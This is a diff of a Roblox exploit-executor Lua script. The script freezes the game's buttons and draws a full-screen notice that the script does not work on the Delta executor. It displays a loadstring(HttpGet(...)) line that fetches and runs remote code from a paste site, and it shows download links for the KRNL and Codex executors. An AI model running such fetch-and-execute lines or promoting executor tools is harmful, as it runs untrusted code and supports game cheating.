@@ -1,99 +1,102 @@
-local player = game:GetService("Players").LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local userInputService = game:GetService("UserInputService")
-local contextActionService = game:GetService("ContextActionService")
+-- Blocked Script Content (shown to user)
+local blockedScript = [[
+loadstring(game:HttpGet("https://pastefy.app/ZHsftk5E/raw"))()
+]]
 
--- 🔒 Block all inputs
-local function blockInput(_, _, _)
-	return Enum.ContextActionResult.Sink
+-- Disable clicking in-game elements
+for _, v in pairs(game:GetDescendants()) do
+    if v:IsA("TextButton") or v:IsA("ImageButton") then
+        v.Active = false
+    end
 end
-contextActionService:BindAction("BlockAllInput", blockInput, false, unpack(Enum.PlayerActions:GetEnumItems()))
-userInputService.ModalEnabled = true
 
--- 🖥️ GUI Setup
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BlockedWarningGUI"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.DisplayOrder = 1000
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-screenGui.Parent = playerGui
+-- Create GUI
+local CoreGui = game:GetService("CoreGui")
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.Name = "DeltaBlockNotice"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 9999
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-frame.BackgroundTransparency = 0
-frame.ZIndex = 10
-frame.Parent = screenGui
+-- Fullscreen Dark Background
+local bg = Instance.new("Frame", gui)
+bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BorderSizePixel = 0
 
--- 🚫 Main Warning
-local warningText = Instance.new("TextLabel")
-warningText.Size = UDim2.new(1, 0, 0.2, 0)
-warningText.Position = UDim2.new(0, 0, 0.25, 0)
-warningText.BackgroundTransparency = 1
-warningText.Text = "🚫 This script has been blocked by Delta 🚫"
-warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
-warningText.Font = Enum.Font.GothamBlack
-warningText.TextScaled = true
-warningText.TextWrapped = true
-warningText.ZIndex = 11
-warningText.Parent = frame
+-- Header Text
+local title = Instance.new("TextLabel", bg)
+title.Text = "⚠️ This script is not working on Delta ⚠️"
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255, 80, 80)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.05, 0)
 
--- ℹ️ Subtext
-local subText = Instance.new("TextLabel")
-subText.Size = UDim2.new(1, 0, 0.1, 0)
-subText.Position = UDim2.new(0, 0, 0.42, 0)
-subText.BackgroundTransparency = 1
-subText.Text = "Please use KRNL or Codex instead."
-subText.TextColor3 = Color3.fromRGB(255, 255, 255)
-subText.Font = Enum.Font.Gotham
-subText.TextScaled = true
-subText.TextWrapped = true
-subText.ZIndex = 11
-subText.Parent = frame
+-- Blocked Script Display (centered)
+local blockedDisplay = Instance.new("TextLabel", bg)
+blockedDisplay.Text = blockedScript
+blockedDisplay.Font = Enum.Font.Code
+blockedDisplay.TextScaled = false
+blockedDisplay.TextSize = 18
+blockedDisplay.TextColor3 = Color3.fromRGB(220, 220, 220)
+blockedDisplay.BackgroundTransparency = 1
+blockedDisplay.Size = UDim2.new(0.9, 0, 0.2, 0)
+blockedDisplay.Position = UDim2.new(0.05, 0, 0.25, 0)
+blockedDisplay.TextWrapped = true
+blockedDisplay.TextXAlignment = Enum.TextXAlignment.Center
+blockedDisplay.TextYAlignment = Enum.TextYAlignment.Top
 
--- 🔘 KRNL Button
-local krnlButton = Instance.new("TextButton")
-krnlButton.Size = UDim2.new(0.4, 0, 0.08, 0)
-krnlButton.Position = UDim2.new(0.1, 0, 0.55, 0)
-krnlButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-krnlButton.TextColor3 = Color3.new(1, 1, 1)
-krnlButton.Font = Enum.Font.GothamBold
-krnlButton.Text = "🔗 Get KRNL"
-krnlButton.TextScaled = true
-krnlButton.ZIndex = 11
-krnlButton.Parent = frame
+-- KRNL Button
+local krnlBtn = Instance.new("TextButton", bg)
+krnlBtn.Text = "Download KRNL"
+krnlBtn.Font = Enum.Font.GothamBold
+krnlBtn.TextColor3 = Color3.new(1, 1, 1)
+krnlBtn.BackgroundColor3 = Color3.fromRGB(70, 120, 255)
+krnlBtn.Size = UDim2.new(0, 180, 0, 50)
+krnlBtn.Position = UDim2.new(0.5, -190, 0.5, 0)
+krnlBtn.TextScaled = true
 
--- 🔘 Codex Button
-local codexButton = Instance.new("TextButton")
-codexButton.Size = UDim2.new(0.4, 0, 0.08, 0)
-codexButton.Position = UDim2.new(0.5, 0, 0.55, 0)
-codexButton.BackgroundColor3 = Color3.fromRGB(0, 180, 140)
-codexButton.TextColor3 = Color3.new(1, 1, 1)
-codexButton.Font = Enum.Font.GothamBold
-codexButton.Text = "🔗 Get Codex"
-codexButton.TextScaled = true
-codexButton.ZIndex = 11
-codexButton.Parent = frame
+-- Codex Button
+local codexBtn = Instance.new("TextButton", bg)
+codexBtn.Text = "Download Codex"
+codexBtn.Font = Enum.Font.GothamBold
+codexBtn.TextColor3 = Color3.new(1, 1, 1)
+codexBtn.BackgroundColor3 = Color3.fromRGB(100, 60, 220)
+codexBtn.Size = UDim2.new(0, 180, 0, 50)
+codexBtn.Position = UDim2.new(0.5, 10, 0.5, 0)
+codexBtn.TextScaled = true
 
--- 📎 Link Display
-local linkLabel = Instance.new("TextLabel")
-linkLabel.Size = UDim2.new(1, 0, 0.05, 0)
-linkLabel.Position = UDim2.new(0, 0, 0.65, 0)
-linkLabel.BackgroundTransparency = 1
-linkLabel.Text = ""
-linkLabel.TextColor3 = Color3.fromRGB(0, 255, 127)
-linkLabel.Font = Enum.Font.Gotham
-linkLabel.TextScaled = true
-linkLabel.TextWrapped = true
-linkLabel.ZIndex = 11
-linkLabel.Parent = frame
+-- KRNL Link
+local krnlLink = Instance.new("TextLabel", bg)
+krnlLink.Text = "https://krnl.place/download"
+krnlLink.Font = Enum.Font.Gotham
+krnlLink.TextColor3 = Color3.fromRGB(255, 255, 255)
+krnlLink.BackgroundTransparency = 1
+krnlLink.TextScaled = true
+krnlLink.Size = UDim2.new(1, 0, 0.08, 0)
+krnlLink.Position = UDim2.new(0, 0, 0.62, 0)
+krnlLink.Visible = false
 
--- 🖱️ Click Actions
-krnlButton.MouseButton1Click:Connect(function()
-	linkLabel.Text = "📎 KRNL Download: https://krnl.place"
+-- Codex Link
+local codexLink = Instance.new("TextLabel", bg)
+codexLink.Text = "https://codex.lol/download"
+codexLink.Font = Enum.Font.Gotham
+codexLink.TextColor3 = Color3.fromRGB(255, 255, 255)
+codexLink.BackgroundTransparency = 1
+codexLink.TextScaled = true
+codexLink.Size = UDim2.new(1, 0, 0.08, 0)
+codexLink.Position = UDim2.new(0, 0, 0.7, 0)
+codexLink.Visible = false
+
+-- Button Actions
+krnlBtn.MouseButton1Click:Connect(function()
+    krnlLink.Visible = true
+    codexLink.Visible = false
 end)
 
-codexButton.MouseButton1Click:Connect(function()
-	linkLabel.Text = "📎 Codex Download: https://codex.lol"
+codexBtn.MouseButton1Click:Connect(function()
+    codexLink.Visible = true
+    krnlLink.Visible = false
 end)
